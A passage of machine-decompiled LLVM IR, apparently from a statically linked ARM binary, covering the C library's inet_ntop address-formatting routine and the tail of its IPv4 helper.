  %v1_18580 = or i32 %v3_1857c, 48
  br i1 %v7_18558, label %dec_label_pc_18570, label %dec_label_pc_18598

dec_label_pc_18570:                               ; preds = %dec_label_pc_18538
  %v7_18588 = icmp eq i32 %v1_18580, 48
  br i1 %v7_18588, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_18570
  store i32 %v1_18550, i32* %r7.global-to-local, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_18570, %bb
  %v1_18590 = trunc i32 %v1_18580 to i8
  store i8 %v1_18590, i8* %v2_1854c, align 1
  %v0_185c4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_185b4

dec_label_pc_18598:                               ; preds = %dec_label_pc_18538
  %v2_18564 = add i32 %v1_18550, %v2_185e8
  %v1_185ac = trunc i32 %v1_18580 to i8
  %v3_185ac = add i32 %v2_18564, -17
  %v4_185ac = inttoptr i32 %v3_185ac to i8*
  store i8 %v1_185ac, i8* %v4_185ac, align 1
  %v0_185b0 = load i32, i32* %r6.global-to-local, align 4
  %v1_185b0 = add i32 %v0_185b0, 1
  store i32 %v1_185b0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_185b4

dec_label_pc_185b4:                               ; preds = %bb18, %dec_label_pc_18598
  %v0_185c4 = phi i32 [ %v0_185c4.pre, %bb18 ], [ %v1_185b0, %dec_label_pc_18598 ]
  %v0_185b4 = load i32, i32* %sb.global-to-local, align 4
  %v1_185b4 = inttoptr i32 %v0_185b4 to i8*
  %v2_185b4 = load i8, i8* %v1_185b4, align 1
  %tmp19 = urem i8 %v2_185b4, 10
  store i32 %v2_185e8, i32* %ip.global-to-local, align 4
  %v1_185c4 = add i32 %v0_185c4, 1
  store i32 %v1_185c4, i32* %r0.global-to-local, align 4
  %v1_185cc = or i8 %tmp19, 48
  %v3_185d0 = add i32 %v2_185c8, %v0_185c4
  %v4_185d0 = inttoptr i32 %v3_185d0 to i8*
  store i8 %v1_185cc, i8* %v4_185d0, align 1
  %v0_185d4 = load i32, i32* %ip.global-to-local, align 4
  %v1_185d4 = load i32, i32* %r0.global-to-local, align 4
  %v2_185d4 = add i32 %v1_185d4, %v0_185d4
  store i32 %v2_185d4, i32* %r2.global-to-local, align 4
  %v3_185dc = add i32 %v2_185d4, -17
  %v4_185dc = inttoptr i32 %v3_185dc to i8*
  store i8 46, i8* %v4_185dc, align 1
  %v0_185e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_185e0 = add i32 %v0_185e0, 1
  store i32 %v1_185e0, i32* %r6.global-to-local, align 4
  %v0_185e4 = load i32, i32* %sl.global-to-local, align 4
  %v1_185e4 = add i32 %v0_185e4, 1
  store i32 %v1_185e4, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_185e8

dec_label_pc_185e8:                               ; preds = %entry, %dec_label_pc_185b4
  %v0_185f4 = phi i32 [ 0, %entry ], [ %v1_185e0, %dec_label_pc_185b4 ]
  %v1_18538 = phi i32 [ 0, %entry ], [ %v1_185e4, %dec_label_pc_185b4 ]
  store i32 %v2_185e8, i32* %ip.global-to-local, align 4
  store i32 %v0_185f4, i32* %r7.global-to-local, align 4
  %v2_185f8 = add i32 %v0_185f4, %v2_185e8
  store i32 %v2_185f8, i32* %r5.global-to-local, align 4
  %v7_185fc = icmp sgt i32 %v1_18538, 3
  br i1 %v7_185fc, label %dec_label_pc_18600, label %dec_label_pc_18538

dec_label_pc_18600:                               ; preds = %dec_label_pc_185e8
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_18604 = ptrtoint i32* %stack_var_-57 to i32
  store i32 %v2_18604, i32* %r4.global-to-local, align 4
  %v3_18608 = add i32 %v2_185f8, -18
  %v4_18608 = inttoptr i32 %v3_18608 to i8*
  store i8 0, i8* %v4_18608, align 1
  %tmp20 = bitcast i32* %stack_var_-57 to i8*
  store i32 %v2_18604, i32* %r0.global-to-local, align 4
  %v3_18610 = call i32 @strlen(i8* %tmp20)
  store i32 %v3_18610, i32* %r0.global-to-local, align 4
  %v2_18614 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_18614, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v3_18610, %v2_18614
  br i1 %tmp, label %dec_label_pc_18620, label %dec_label_pc_18634

dec_label_pc_18620:                               ; preds = %dec_label_pc_18600
  %v0_18620 = call i32 @__GI___errno_location()
  store i32 %v0_18620, i32* %r0.global-to-local, align 4
  %v0_18628 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_18628, i32* %r2.global-to-local, align 4
  %v2_1862c = inttoptr i32 %v0_18620 to i32*
  store i32 28, i32* %v2_1862c, align 4
  %v0_18644.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18644

dec_label_pc_18634:                               ; preds = %dec_label_pc_18600
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_18604, i32* @r1, align 4
  %v2_1863c = inttoptr i32 %arg2 to i8*
  %v3_1863c = call i32 @strcpy(i8* %v2_1863c, i32 %v2_18604)
  store i32 %v3_1863c, i32* %r0.global-to-local, align 4
  store i32 %v3_1863c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18644

dec_label_pc_18644:                               ; preds = %dec_label_pc_18620, %dec_label_pc_18634
  %v0_18644 = phi i32 [ %v0_18644.pre, %dec_label_pc_18620 ], [ %v3_1863c, %dec_label_pc_18634 ]
  store i32 %v0_18644, i32* %r0.global-to-local, align 4
  ret i32 %v0_18644

; uselistorder directives
  uselistorder i32 %v0_18644, { 1, 0 }
  uselistorder i32 %v2_18604, { 1, 0, 2, 3 }
  uselistorder i32 %v2_185f8, { 0, 2, 1 }
  uselistorder i32 %v1_18538, { 1, 0 }
  uselistorder i32 %v1_18580, { 1, 0, 2 }
  uselistorder i32 %v2_185e8, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-57, { 0, 2, 1 }
  uselistorder i32* %r7.global-to-local, { 3, 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 6, 11, 7, 8, 9, 10, 2, 1, 0 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1 }
  uselistorder i8 48, { 0, 6, 1, 4, 7, 8, 9, 10, 11, 2, 3, 12, 5 }
  uselistorder i32 -17, { 2, 3, 4, 5, 0, 6, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_18644, { 1, 0 }
  uselistorder label %dec_label_pc_185e8, { 1, 0 }
  uselistorder label %dec_label_pc_185b4, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-118 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %v6_18654 = load i32, i32* @r5, align 4
  %v7_18660 = icmp eq i32 %arg1, 2
  store i1 %v7_18660, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r5, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg4, i32* %stack_var_-128, align 4
  br i1 %v7_18660, label %dec_label_pc_18684, label %dec_label_pc_18678

dec_label_pc_18678:                               ; preds = %entry
  %v7_18678 = icmp eq i32 %arg1, 10
  store i1 %v7_18678, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18678, label %dec_label_pc_18698, label %dec_label_pc_188ac

dec_label_pc_18684:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r2.global-to-local, align 4
  %v3_18690 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_188a4

dec_label_pc_18698:                               ; preds = %dec_label_pc_18678
  %v2_18698 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_18698, i32* %r0.global-to-local, align 4
  store i32 32, i32* @r2, align 4
  %v2_186a4 = bitcast i32* %stack_var_-72 to i8*
  %v3_186a4 = call i32 @__GI_memset(i8* %v2_186a4, i32 0)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_186c8 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_186ac

dec_label_pc_186ac:                               ; preds = %dec_label_pc_186ac.dec_label_pc_186ac_crit_edge, %dec_label_pc_18698
  %v0_186c4 = phi i32 [ %v0_186ac.pre, %dec_label_pc_186ac.dec_label_pc_186ac_crit_edge ], [ 0, %dec_label_pc_18698 ]
  %v1_186ac = load i32, i32* @r8, align 4
  %v2_186ac = add i32 %v1_186ac, %v0_186c4
  %v3_186b0 = inttoptr i32 %v2_186ac to i8*
  %v4_186b0 = load i8, i8* %v3_186b0, align 1
  %v6_186b0 = zext i8 %v4_186b0 to i32
  %v1_186b4 = add i32 %v2_186ac, 1
  %v2_186b4 = inttoptr i32 %v1_186b4 to i8*
  %v3_186b4 = load i8, i8* %v2_186b4, align 1
  %v4_186b4 = zext i8 %v3_186b4 to i32
  %tmp74 = icmp slt i32 %v0_186c4, 0
  %v4_186b8 = zext i1 %tmp74 to i32
  %v5_186b8 = add i32 %v4_186b8, %v0_186c4
  %v4_186bc = mul nuw nsw i32 %v6_186b0, 256
  %v5_186bc = or i32 %v4_186b4, %v4_186bc
  store i32 %v5_186bc, i32* %r2.global-to-local, align 4
  %v3_186c0 = sdiv i32 %v5_186b8, 2
  %v1_186c4 = add i32 %v0_186c4, 2
  store i32 %v1_186c4, i32* %r0.global-to-local, align 4
  %v4_186cc = mul i32 %v3_186c0, 4
  %v5_186cc = add i32 %v4_186cc, %v2_186c8
  %v7_186d0 = icmp eq i32 %v1_186c4, 15
  store i1 %v7_186d0, i1* %cpsr_z.global-to-local, align 1
  %v2_186d4 = add i32 %v5_186cc, -32
  %v3_186d4 = inttoptr i32 %v2_186d4 to i32*
  store i32 %v5_186bc, i32* %v3_186d4, align 4
  %v7_186d8 = icmp sgt i32 %v1_186c4, 15
  br i1 %v7_186d8, label %dec_label_pc_186dc, label %dec_label_pc_186ac.dec_label_pc_186ac_crit_edge

dec_label_pc_186ac.dec_label_pc_186ac_crit_edge:  ; preds = %dec_label_pc_186ac
  %v0_186ac.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_186ac

dec_label_pc_186dc:                               ; preds = %dec_label_pc_186ac
  store i32 -1, i32* @r6, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_186f4

dec_label_pc_186f4:                               ; preds = %dec_label_pc_186dc, %dec_label_pc_18740
  %v0_18734 = phi i32 [ -1, %dec_label_pc_186dc ], [ %v0_18768, %dec_label_pc_18740 ]
  %v0_18724 = phi i32 [ -1, %dec_label_pc_186dc ], [ %v0_18754, %dec_label_pc_18740 ]
  %v0_18708 = phi i32 [ -1, %dec_label_pc_186dc ], [ %v0_187087, %dec_label_pc_18740 ]
  %v0_18740 = phi i32 [ 0, %dec_label_pc_186dc ], [ %v1_18740, %dec_label_pc_18740 ]
  %v4_186f8 = mul nuw nsw i32 %v0_18740, 4
  %v5_186f8 = add i32 %v4_186f8, %v2_186c8
  %v1_186fc = add i32 %v5_186f8, -32
  %v2_186fc = inttoptr i32 %v1_186fc to i32*
  %v3_186fc = load i32, i32* %v2_186fc, align 4
  %v2_18700 = icmp eq i32 %v3_186fc, 0
  %v7_18708 = icmp eq i32 %v0_18708, -1
  br i1 %v2_18700, label %dec_label_pc_18708, label %dec_label_pc_1871c

dec_label_pc_18708:                               ; preds = %dec_label_pc_186f4
  br i1 %v7_18708, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_18708
  store i32 %v0_18740, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_18740

.thread:                                          ; preds = %dec_label_pc_18708
  %v1_18714.pre = load i32, i32* @r4, align 4
  %v2_18714 = add i32 %v1_18714.pre, 1
  store i32 %v2_18714, i32* @r4, align 4
  br label %dec_label_pc_18740

dec_label_pc_1871c:                               ; preds = %dec_label_pc_186f4
  br i1 %v7_18708, label %dec_label_pc_18740, label %dec_label_pc_18724

dec_label_pc_18724:                               ; preds = %dec_label_pc_1871c
  %v7_18724 = icmp eq i32 %v0_18724, -1
  %v0_18738.pre = load i32, i32* @r4, align 4
  %v1_1872c = load i32, i32* @r7, align 4
  %v7_18730 = icmp sgt i32 %v0_18738.pre, %v1_1872c
  %or.cond = or i1 %v7_18724, %v7_18730
  br i1 %or.cond, label %dec_label_pc_18734, label %dec_label_pc_1873c

dec_label_pc_18734:                               ; preds = %dec_label_pc_18724
  store i32 %v0_18734, i32* @r6, align 4
  store i32 %v0_18738.pre, i32* @r7, align 4
  br label %dec_label_pc_1873c

dec_label_pc_1873c:                               ; preds = %dec_label_pc_18724, %dec_label_pc_18734
  %v0_1872412 = phi i32 [ %v0_18734, %dec_label_pc_18734 ], [ %v0_18724, %dec_label_pc_18724 ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18740

dec_label_pc_18740:                               ; preds = %bb, %.thread, %dec_label_pc_1871c, %dec_label_pc_1873c
  %v0_18768 = phi i32 [ %v0_18734, %.thread ], [ %v0_18740, %bb ], [ %v0_18734, %dec_label_pc_1871c ], [ -1, %dec_label_pc_1873c ]
  %v0_187087 = phi i32 [ %v0_18708, %.thread ], [ %v0_18740, %bb ], [ -1, %dec_label_pc_1871c ], [ -1, %dec_label_pc_1873c ]
  %v0_18754 = phi i32 [ %v0_18724, %.thread ], [ %v0_18724, %bb ], [ %v0_18724, %dec_label_pc_1871c ], [ %v0_1872412, %dec_label_pc_1873c ]
  %v1_18740 = add nuw nsw i32 %v0_18740, 1
  %v7_18748 = icmp slt i32 %v1_18740, 8
  br i1 %v7_18748, label %dec_label_pc_186f4, label %dec_label_pc_1874c

dec_label_pc_1874c:                               ; preds = %dec_label_pc_18740
  %v7_1874c = icmp eq i32 %v0_18768, -1
  store i1 %v7_1874c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1874c, label %dec_label_pc_1874c.dec_label_pc_1876c_crit_edge, label %dec_label_pc_18754

dec_label_pc_1874c.dec_label_pc_1876c_crit_edge:  ; preds = %dec_label_pc_1874c
  %v1_18790.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1876c

dec_label_pc_18754:                               ; preds = %dec_label_pc_1874c
  %v7_18754 = icmp eq i32 %v0_18754, -1
  store i1 %v7_18754, i1* %cpsr_z.global-to-local, align 1
  %v0_18764.pre = load i32, i32* @r4, align 4
  br i1 %v7_18754, label %dec_label_pc_18764, label %dec_label_pc_1875c

dec_label_pc_1875c:                               ; preds = %dec_label_pc_18754
  %v1_1875c = load i32, i32* @r7, align 4
  %v9_1875c = icmp eq i32 %v0_18764.pre, %v1_1875c
  store i1 %v9_1875c, i1* %cpsr_z.global-to-local, align 1
  %v7_18760 = icmp sgt i32 %v0_18764.pre, %v1_1875c
  br i1 %v7_18760, label %dec_label_pc_18764, label %dec_label_pc_1876c

dec_label_pc_18764:                               ; preds = %dec_label_pc_18754, %dec_label_pc_1875c
  store i32 %v0_18764.pre, i32* @r7, align 4
  store i32 %v0_18768, i32* @r6, align 4
  br label %dec_label_pc_1876c

dec_label_pc_1876c:                               ; preds = %dec_label_pc_1874c.dec_label_pc_1876c_crit_edge, %dec_label_pc_1875c, %dec_label_pc_18764
  %v1_18790.pre = phi i32 [ %v1_1875c, %dec_label_pc_1875c ], [ %v1_18790.pre.pre, %dec_label_pc_1874c.dec_label_pc_1876c_crit_edge ], [ %v0_18764.pre, %dec_label_pc_18764 ]
  %v0_1876c = phi i32 [ %v0_18754, %dec_label_pc_1875c ], [ %v0_18754, %dec_label_pc_1874c.dec_label_pc_1876c_crit_edge ], [ %v0_18768, %dec_label_pc_18764 ]
  %v7_1876c = icmp eq i32 %v0_1876c, -1
  store i1 %v7_1876c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1876c, label %dec_label_pc_1876c._crit_edge, label %dec_label_pc_18774

dec_label_pc_18774:                               ; preds = %dec_label_pc_1876c
  %v7_18774 = icmp eq i32 %v1_18790.pre, 1
  store i1 %v7_18774, i1* %cpsr_z.global-to-local, align 1
  %v7_18778 = icmp slt i32 %v1_18790.pre, 2
  br i1 %v7_18778, label %bb54, label %dec_label_pc_1876c._crit_edge

bb54:                                             ; preds = %dec_label_pc_18774
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_1876c._crit_edge

dec_label_pc_1876c._crit_edge:                    ; preds = %dec_label_pc_1876c, %dec_label_pc_18774, %bb54
  %v0_18790 = phi i32 [ %v0_1876c, %dec_label_pc_18774 ], [ -1, %bb54 ], [ %v0_1876c, %dec_label_pc_1876c ]
  %v2_18780 = ptrtoint i32* %stack_var_-118 to i32
  store i32 %v2_18780, i32* @r4, align 4
  %v0_18784 = load i32, i32* @r5, align 4
  %v2_18784 = add i32 %v0_18784, -32956
  store i32 %v2_18784, i32* @fp, align 4
  store i32 58, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v2_18790 = add i32 %v0_18790, %v1_18790.pre
  store i32 %v2_18790, i32* @sl, align 4
  %v9_187f0 = icmp eq i32 %tmp, 65535
  %v7_1879868 = icmp eq i32 %v0_18790, -1
  store i1 %v7_1879868, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18798

dec_label_pc_18798:                               ; preds = %dec_label_pc_1876c._crit_edge, %dec_label_pc_18848
  %v7_1879872 = phi i1 [ %v7_1879868, %dec_label_pc_1876c._crit_edge ], [ %v7_18798, %dec_label_pc_18848 ]
  %v0_187c471 = phi i32 [ 0, %dec_label_pc_1876c._crit_edge ], [ %v1_18848, %dec_label_pc_18848 ]
  %v1_187b070 = phi i32 [ %v0_18790, %dec_label_pc_1876c._crit_edge ], [ %v0_18798.pre, %dec_label_pc_18848 ]
  %v2_187c869 = phi i32 [ %v2_18780, %dec_label_pc_1876c._crit_edge ], [ %v3_187b429, %dec_label_pc_18848 ]
  br i1 %v7_1879872, label %dec_label_pc_187bc, label %dec_label_pc_187a0

dec_label_pc_187a0:                               ; preds = %dec_label_pc_18798
  %v9_187a0 = icmp eq i32 %v0_187c471, %v1_187b070
  store i1 %v9_187a0, i1* %cpsr_z.global-to-local, align 1
  %v5_187a4 = icmp slt i32 %v0_187c471, %v1_187b070
  br i1 %v5_187a4, label %dec_label_pc_187bc, label %dec_label_pc_187a8

dec_label_pc_187a8:                               ; preds = %dec_label_pc_187a0
  %v1_187a8 = load i32, i32* @sl, align 4
  %v9_187a8 = icmp eq i32 %v0_187c471, %v1_187a8
  store i1 %v9_187a8, i1* %cpsr_z.global-to-local, align 1
  %v6_187ac = icmp slt i32 %v0_187c471, %v1_187a8
  br i1 %v6_187ac, label %dec_label_pc_187b0, label %dec_label_pc_187bc

dec_label_pc_187b0:                               ; preds = %dec_label_pc_187a8
  store i1 %v9_187a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_187a0, label %bb56, label %dec_label_pc_18848

bb56:                                             ; preds = %dec_label_pc_187b0
  %v1_187b4 = load i32, i32* @sb, align 4
  %v2_187b4 = trunc i32 %v1_187b4 to i8
  %v4_187b4 = inttoptr i32 %v2_187c869 to i8*
  store i8 %v2_187b4, i8* %v4_187b4, align 1
  %v5_187b4 = load i32, i32* @r4, align 4
  %v6_187b4 = add i32 %v5_187b4, 1
  store i32 %v6_187b4, i32* @r4, align 4
  br label %dec_label_pc_18848

dec_label_pc_187bc:                               ; preds = %dec_label_pc_187a8, %dec_label_pc_187a0, %dec_label_pc_18798
  %v2_187bc = icmp eq i32 %v0_187c471, 0
  store i1 %v2_187bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_187bc, label %dec_label_pc_1882c, label %dec_label_pc_187c4

dec_label_pc_187c4:                               ; preds = %dec_label_pc_187bc
  %v7_187c4 = icmp eq i32 %v0_187c471, 6
  store i1 %v7_187c4, i1* %cpsr_z.global-to-local, align 1
  %v0_187c8 = load i32, i32* @sb, align 4
  %v1_187c8 = trunc i32 %v0_187c8 to i8
  %v3_187c8 = inttoptr i32 %v2_187c869 to i8*
  store i8 %v1_187c8, i8* %v3_187c8, align 1
  %v4_187c8 = load i32, i32* @r4, align 4
  %v5_187c8 = add i32 %v4_187c8, 1
  store i32 %v5_187c8, i32* @r4, align 4
  %v0_187cc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_187cc, label %dec_label_pc_187d0, label %dec_label_pc_1882c

dec_label_pc_187d0:                               ; preds = %dec_label_pc_187c4
  %v0_187d0 = load i32, i32* @r6, align 4
  %v2_187d0 = icmp eq i32 %v0_187d0, 0
  store i1 %v2_187d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_187d0, label %dec_label_pc_187d8, label %dec_label_pc_1882c

dec_label_pc_187d8:                               ; preds = %dec_label_pc_187d0
  %v0_187d8 = load i32, i32* @r7, align 4
  %v7_187d8 = icmp eq i32 %v0_187d8, 6
  store i1 %v7_187d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_187d8, label %dec_label_pc_187f8, label %dec_label_pc_187e0

dec_label_pc_187e0:                               ; preds = %dec_label_pc_187d8
  %v7_187e0 = icmp eq i32 %v0_187d8, 5
  store i1 %v7_187e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_187e0, label %dec_label_pc_187e8, label %dec_label_pc_1882c

dec_label_pc_187e8:                               ; preds = %dec_label_pc_187e0
  store i1 %v9_187f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_187f0, label %dec_label_pc_187f8, label %dec_label_pc_1882c

dec_label_pc_187f8:                               ; preds = %dec_label_pc_187e8, %dec_label_pc_187d8
  %v2_187fc = sub i32 %v2_186c8, %v5_187c8
  %v1_18800 = add i32 %v2_187fc, -32
  store i32 %v1_18800, i32* %r2.global-to-local, align 4
  %v0_18804 = load i32, i32* @r8, align 4
  %v1_18804 = add i32 %v0_18804, 12
  store i32 %v1_18804, i32* %r0.global-to-local, align 4
  %v3_1880c = call i32 @inet_ntop4(i32 %v1_18804, i32 %v5_187c8, i32 %v1_18800)
  store i32 %v3_1880c, i32* %r0.global-to-local, align 4
  %v2_18810 = icmp eq i32 %v3_1880c, 0
  store i1 %v2_18810, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18810, label %bb57, label %dec_label_pc_1881c

bb57:                                             ; preds = %dec_label_pc_187f8
  %v1_18814 = load i32, i32* @r6, align 4
  store i32 %v1_18814, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_188bc

dec_label_pc_1881c:                               ; preds = %dec_label_pc_187f8
  %v0_1881c = load i32, i32* @r4, align 4
  %v1_1881c = inttoptr i32 %v0_1881c to i8*
  store i32 %v0_1881c, i32* %r0.global-to-local, align 4
  %v3_18820 = call i32 @strlen(i8* %v1_1881c)
  store i32 %v3_18820, i32* %r0.global-to-local, align 4
  %v0_18824 = load i32, i32* @r4, align 4
  %v2_18824 = add i32 %v0_18824, %v3_18820
  store i32 %v2_18824, i32* @r4, align 4
  %v0_1885c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1885c

dec_label_pc_1882c:                               ; preds = %dec_label_pc_187e8, %dec_label_pc_187e0, %dec_label_pc_187d0, %dec_label_pc_187c4, %dec_label_pc_187bc
  %v0_18834 = phi i32 [ %v5_187c8, %dec_label_pc_187e8 ], [ %v5_187c8, %dec_label_pc_187e0 ], [ %v5_187c8, %dec_label_pc_187d0 ], [ %v5_187c8, %dec_label_pc_187c4 ], [ %v2_187c869, %dec_label_pc_187bc ]
  store i32 %v2_186c8, i32* @lr, align 4
  %v1_18830 = load i32, i32* @r5, align 4
  %v4_18830 = mul i32 %v1_18830, 4
  %v5_18830 = add i32 %v4_18830, %v2_186c8
  store i32 %v0_18834, i32* @r0, align 4
  %v1_18838 = add i32 %v5_18830, -32
  %v2_18838 = inttoptr i32 %v1_18838 to i32*
  %v3_18838 = load i32, i32* %v2_18838, align 4
  store i32 %v3_18838, i32* %r2.global-to-local, align 4
  %v0_1883c = load i32, i32* @fp, align 4
  %v7_18840 = call i32 @sprintf(i32 %v0_18834, i32 %v0_1883c, i32 %v3_18838, i32 %v5_18830, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_18840, i32* %r0.global-to-local, align 4
  %v0_18844 = load i32, i32* @r4, align 4
  %v2_18844 = add i32 %v0_18844, %v7_18840
  store i32 %v2_18844, i32* @r4, align 4
  br label %dec_label_pc_18848

dec_label_pc_18848:                               ; preds = %bb56, %dec_label_pc_187b0, %dec_label_pc_1882c
  %v3_187b429 = phi i32 [ %v6_187b4, %bb56 ], [ %v2_187c869, %dec_label_pc_187b0 ], [ %v2_18844, %dec_label_pc_1882c ]
  %v0_18848 = load i32, i32* @r5, align 4
  %v1_18848 = add i32 %v0_18848, 1
  store i32 %v1_18848, i32* @r5, align 4
  %v0_18798.pre = load i32, i32* @r6, align 4
  %v7_18850 = icmp slt i32 %v1_18848, 8
  %v7_18798 = icmp eq i32 %v0_18798.pre, -1
  store i1 %v7_18798, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18850, label %dec_label_pc_18798, label %dec_label_pc_18854

dec_label_pc_18854:                               ; preds = %dec_label_pc_18848
  br i1 %v7_18798, label %.thread2, label %dec_label_pc_1885c

dec_label_pc_1885c:                               ; preds = %dec_label_pc_18854, %dec_label_pc_1881c
  %v3_18868 = phi i32 [ %v3_187b429, %dec_label_pc_18854 ], [ %v2_18824, %dec_label_pc_1881c ]
  %v0_1885c = phi i32 [ %v0_18798.pre, %dec_label_pc_18854 ], [ %v0_1885c.pre, %dec_label_pc_1881c ]
  %v1_1885c = load i32, i32* @r7, align 4
  %v2_1885c = add i32 %v1_1885c, %v0_1885c
  %v7_18860 = icmp eq i32 %v2_1885c, 8
  store i1 %v7_18860, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18860, label %bb58, label %.thread2

bb58:                                             ; preds = %dec_label_pc_1885c
  %v4_18868 = inttoptr i32 %v3_18868 to i8*
  store i8 58, i8* %v4_18868, align 1
  %v5_18868 = load i32, i32* @r4, align 4
  %v6_18868 = add i32 %v5_18868, 1
  store i32 %v6_18868, i32* @r4, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1885c, %dec_label_pc_18854, %bb58
  %v2_18870 = phi i32 [ %v3_18868, %dec_label_pc_1885c ], [ %v3_187b429, %dec_label_pc_18854 ], [ %v6_18868, %bb58 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_18870 = inttoptr i32 %v2_18870 to i8*
  store i8 0, i8* %v3_18870, align 1
  %v4_18870 = load i32, i32* @r4, align 4
  %v5_18870 = add i32 %v4_18870, 1
  store i32 %v2_18780, i32* @r1, align 4
  %v2_18878 = load i32, i32* %stack_var_-128, align 4
  store i32 %v2_18878, i32* %r2.global-to-local, align 4
  %v2_1887c = sub i32 %v5_18870, %v2_18780
  %v9_18880 = icmp eq i32 %v2_1887c, %v2_18878
  store i1 %v9_18880, i1* %cpsr_z.global-to-local, align 1
  %tmp75 = icmp ugt i32 %v2_1887c, %v2_18878
  br i1 %tmp75, label %dec_label_pc_18888, label %dec_label_pc_1889c

dec_label_pc_18888:                               ; preds = %.thread2
  %v0_18888 = call i32 @__GI___errno_location()
  store i32 %v0_18888, i32* %r0.global-to-local, align 4
  %v0_18890 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_18890, i32* %r2.global-to-local, align 4
  %v2_18894 = inttoptr i32 %v0_18888 to i32*
  store i32 28, i32* %v2_18894, align 4
  %v0_188bc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_188bc

dec_label_pc_1889c:                               ; preds = %.thread2
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_188a0 = inttoptr i32 %arg3 to i8*
  %v3_188a0 = call i32 @strcpy(i8* %v2_188a0, i32 %v2_18780)
  br label %dec_label_pc_188a4

dec_label_pc_188a4:                               ; preds = %dec_label_pc_18684, %dec_label_pc_1889c
  %storemerge = phi i32 [ %v3_18690, %dec_label_pc_18684 ], [ %v3_188a0, %dec_label_pc_1889c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_188bc

dec_label_pc_188ac:                               ; preds = %dec_label_pc_18678
  %v0_188ac = call i32 @__GI___errno_location()
  store i32 %v0_188ac, i32* %r0.global-to-local, align 4
  %v2_188b4 = inttoptr i32 %v0_188ac to i32*
  store i32 97, i32* %v2_188b4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_188bc

dec_label_pc_188bc:                               ; preds = %bb57, %dec_label_pc_188a4, %dec_label_pc_18888, %dec_label_pc_188ac
  %v0_188bc = phi i32 [ %v1_18814, %bb57 ], [ %storemerge, %dec_label_pc_188a4 ], [ %v0_188bc.pre, %dec_label_pc_18888 ], [ 0, %dec_label_pc_188ac ]
  store i32 %v0_188bc, i32* %r0.global-to-local, align 4
